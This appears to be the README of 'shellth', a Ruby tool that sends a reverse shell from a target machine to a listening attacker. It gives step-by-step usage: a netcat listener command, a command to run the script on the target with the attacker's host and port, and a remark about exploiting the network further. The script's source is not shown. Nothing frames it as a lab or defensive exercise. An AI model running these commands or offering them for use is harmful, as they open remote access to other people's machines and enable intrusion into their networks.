shellth

![Screenshot](/screenshot.png)
=======================================================================================================================
[![GPL Licence](https://badges.frapsoft.com/os/gpl/gpl-150x33.png?v=103)](https://opensource.org/licenses/GPL-3.0/)

[![Open Source Love](https://badges.frapsoft.com/os/v2/open-source-175x29.png?v=103)](https://github.com/ellerbrock/open-source-badges/)

**With shellth you can send back a reverse shell to a listening attacker to open a remote network access.**  

**1. Set up a listener. `$ nc -n -lvp <port>`**  
**2. Now run on the target machine. `$ ruby shellth.rb --rhost <remote host> --port <port>`**  
**3. Now it should be a simple case of exploiting the network further.**  

[![Ruby](https://img.shields.io/badge/Ruby-CC342D?style=for-the-badge&logo=ruby&logoColor=white/)
